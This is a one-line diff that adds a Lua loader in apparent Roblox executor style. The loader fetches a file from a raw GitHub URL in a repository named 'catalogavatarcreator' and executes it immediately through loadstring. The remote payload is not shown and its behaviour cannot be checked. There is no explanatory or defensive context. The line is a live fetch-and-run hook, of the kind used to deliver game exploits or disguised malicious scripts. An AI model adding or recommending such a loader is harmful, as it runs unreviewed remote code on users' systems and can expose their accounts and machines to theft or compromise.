@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rolezeay/catalogavatarcreator/refs/heads/main/hmmm"))() 
